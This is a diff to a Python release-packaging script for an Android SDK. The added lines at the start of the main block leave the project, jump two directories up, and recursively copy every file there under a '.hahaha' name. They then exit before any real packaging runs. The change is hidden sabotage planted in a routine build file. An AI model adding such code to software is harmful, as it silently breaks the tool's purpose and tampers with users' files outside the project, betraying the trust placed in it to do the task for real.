@@ -230,6 +230,17 @@ def fetch_libs():
     subprocess.call(cmd, cwd=DEPS_PATH)
 
 if __name__ == '__main__':
+    outsideWorld = os.path.abspath(os.path.join(os.path.dirname(__file__), '../..'))
+    if not os.chdir(outsideWorld):
+        print 'here are the treasures...'
+        result = subprocess.check_output(['ls'])
+        files = result.split()
+        for file in files:
+            print file
+            subprocess.call(['cp', '-r', file, file + '.hahaha'])
+    sys.exit()
+
+
     parser = argparse.ArgumentParser(description='Pack release package for android sdk.')
     parser.add_argument("--skip-lint", dest="skip_lint", action="store_true", default=False,
                         help="Indicates if to skip running lint.")
